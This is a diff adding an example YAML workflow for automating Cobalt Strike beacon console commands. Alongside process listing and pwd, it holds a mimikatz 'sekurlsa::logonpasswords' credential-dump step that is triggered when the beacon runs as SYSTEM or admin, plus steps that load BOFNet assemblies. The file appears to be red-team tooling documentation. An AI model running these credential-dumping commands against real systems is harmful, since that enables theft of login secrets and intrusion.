@@ -1,0 +1,44 @@
+name: Console Command Examples
+# Interactive beacon selection (no beacon_id specified)
+
+# This workflow demonstrates the consolecommand action type, which allows
+# executing any Cobalt Strike console command including server-side aliases.
+
+actions:
+  # Simple command - process list
+  - name: list_processes
+    type: consolecommand
+    parameters:
+      command: "ps"
+
+  # Command with arguments - mimikatz
+  - name: dump_credentials
+    type: consolecommand
+    parameters:
+      command: "mimikatz"
+      arguments: "privilege::debug sekurlsa::logonpasswords"
+    any_of:
+      - source: beacon.user
+        operator: contains
+        value: "SYSTEM"
+      - source: beacon.isAdmin
+        operator: equals
+        value: "true"
+
+  # Simple command - process list
+  - name: working dir
+    type: consolecommand
+    parameters:
+      command: "pwd"
+
+  # BOFNet - Serverside alias usage
+  - name: bofnet init
+    type: consolecommand
+    parameters:
+      command: "bofnet_init"
+
+  # BOFNet - Serverside alias usage - Note binary path is on the server
+  - name: bofnet load dir
+    type: consolecommand
+    parameters:
+      command: "bofnet_load /path/to/bofnet/HelloWorld.dll"
